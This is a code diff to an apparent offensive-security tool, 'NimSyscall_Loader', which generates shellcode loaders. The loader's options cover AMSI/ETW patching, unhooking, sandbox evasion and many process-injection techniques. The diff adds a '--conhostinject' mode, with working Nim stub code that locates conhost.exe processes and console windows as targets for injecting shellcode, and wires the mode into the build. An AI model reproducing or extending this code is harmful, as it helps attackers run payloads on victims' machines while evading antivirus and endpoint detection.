@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -203,6 +203,7 @@ Options:
       --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
       --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
   --poolparty number    Use Poolparty technique 1,2,3,4 for execution
+  --conhostinject    Inject into a remote conhost.exe process and trigger execution without Thread or APC or similar
   --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)  
   --Caro-Kann-Thread   Same as Caro-Kann, but the Shellcode will not do a direct JMP but instead create a Thread on the start address 
   --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
@@ -378,6 +379,7 @@ var
     noAntiEmulate: bool = false
     poolparty: int = 1
     usepoolparty: bool = false
+    conhostinject: bool = false
     noRandom: bool = false
     payloadFunction: string = ""
 
@@ -846,6 +848,12 @@ if args["--poolparty"]:
     let poolpartyarg = args["--poolparty"]
     poolparty = parse_int($poolpartyarg)
     suspended = false
+
+if args["--conhostinject"]:
+    conhostinject = true
+    remoteinject = true
+    localinject = false
+    existingprocessInjection = true
 
 if args["--Caro-Kann"]:
     carokann = true
@@ -3620,6 +3628,98 @@ let NotepadProcIDStub * = fmt"""
 
 
 """
+
+
+let conhostinjectenumstubs * = """
+
+proc toString(chars: openArray[WCHAR]): string =
+    result = ""
+    for c in chars:
+        if cast[char](c) == '\0':
+            break
+        result.add(cast[char](c))
+
+proc getParentPID(): DWORD =
+    var hwnd = GetForegroundWindow()
+    var processId: DWORD = 0
+    GetWindowThreadProcessId(hwnd, cast[LPDWORD](addr(processId)))
+    return processId
+
+proc getConHostID(dwPPid: DWORD):DWORD =
+    try:
+        var 
+            entry : PROCESSENTRY32A
+            snapshot : HANDLE
+            pid : DWORD = 0
+        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot != INVALID_HANDLE_VALUE:
+            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
+            if Process32FirstA(snapshot,addr entry):
+                if ($(entry.szExeFile).join()).contains(obf("conhost.exe")):
+                    if entry.th32ParentProcessID == dwPPid:
+                        result = entry.th32ProcessID
+                while Process32NextA(snapshot,addr entry):
+                    if ($(entry.szExeFile).join()).contains(obf("conhost.exe")):
+                        if entry.th32ParentProcessID == dwPPid:
+                            result = entry.th32ProcessID
+                            break
+    except:
+        when defined(verbose):
+            echo obf("[-] Process ID not found")
+        
+
+type
+  ConsoleWindow* = object
+    EnableBothScrollBars: uint64
+    UpdateScrollBar: uint64
+    IsInFullscreen: uint64
+    SetIsFullscreen: uint64
+    SetViewportOrigin: uint64
+    SetWindowHasMoved: uint64
+    CaptureMouse: uint64
+    ReleaseMouse: uint64
+    GetWindowHandle: uint64
+    SetOwner: uint64
+    GetCursorPosition: uint64
+    GetClientRectangle: uint64
+    MapPoints: uint64
+    ConvertScreenToClient: uint64
+    SendNotifyBeep: uint64
+    PostUpdateScrollBars: uint64
+    PostUpdateTitleWithCopy: uint64
+    PostUpdateWindowSize: uint64
+    UpdateWindowSize: uint64
+    UpdateWindowText: uint64
+    HorizontalScroll: uint64
+    VerticalScroll: uint64
+    SignalUia: uint64
+    UiaSetTextAreaFocus: uint64
+    GetWindowRect: uint64
+
+var hwnd: HWND
+
+proc EnumWindowsProc(enumhwnd: HWND, lParam: LPARAM): BOOL {.stdcall.} =
+  var className: array[32, WCHAR]
+  var pid,ppid: DWORD
+  if GetClassNameW(enumhwnd, cast[LPWSTR](addr className[0]), (int32)className.len) > 0:
+    if toString(className) == "ConsoleWindowClass":
+        when defined(verbose):
+            echo "[+] Found a console window with HWND: ", enumhwnd
+        hwnd = enumhwnd
+        GetWindowThreadProcessId(hwnd, addr ppid)
+        # We prefer to inject into a process, that is not the parent of the current process, e.G. cmd for a binary
+        if ppid != getParentPID():
+            return false
+        else:
+            when defined(verbose):
+                echo "[*] We prefer to not inject into our parent process such as cmd. If no other candidate if found, we will still do it\n"
+            return true
+    return true
+
+
+"""
+
+
 let MainStub * = """
 
 when not defined(DInvoke):
@@ -3899,6 +3999,9 @@ if(dripallocate):
 if(threadless):
     stub.add(ThreadlessInjectStub)
 
+if(conhostinject):
+    stub.add(conhostinjectenumstubs)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -3908,7 +4011,7 @@ if(getfreshstub):
     stub.add(RetrieveSyscallStubs)
 
 # if ruy-lopez and localinject or csharp/peload add NotepadProcIDStub
-if(ruylopez and (localinject or csharp or peload)):
+if(ruylopez and (localinject or csharp or peload) and (not conhostinject)):
     stub.add(NotepadProcIDStub)
 
 if(unhook):
@@ -4025,7 +4128,8 @@ if (shellcode):
         stub.add(getRandStub())
         if (hellsgate):
             if (processname == ""):
-                stub.add(NotepadProcIDStub)
+                if (not conhostinject):
+                    stub.add(NotepadProcIDStub)
                 if (useQueueAPC):
                     stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
@@ -4053,7 +4157,8 @@ if (shellcode):
         elif(syswhispers):
             if (processname == ""):
                 stub.add(getRandStub())
-                stub.add(NotepadProcIDStub)
+                if (not conhostinject):
+                    stub.add(NotepadProcIDStub)
                 if (useQueueAPC):
                     stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
@@ -4083,7 +4188,8 @@ if (shellcode):
         elif (getfreshstub):
             stub.add(getRandStub())
             if (processname == ""):
-                stub.add(NotepadProcIDStub)
+                if (not conhostinject):
+                    stub.add(NotepadProcIDStub)
                 if (useQueueAPC):
                     stub.add(RemoteForceSleepStub)
                 if (remoteETWpatch):
@@ -4292,8 +4398,11 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
-if((existingprocessInjection == false) and (remoteinject)):
+if((existingprocessInjection == false) and (remoteinject) and (not conhostinject)):
     basicCompileFlags.add("-d:spawninject ")
+
+if(conhostinject):
+    basicCompileFlags.add("-d:conhostinject ")
 
 if (retrieveFromFile):
     stub.add(ShellcodefromFileStub)
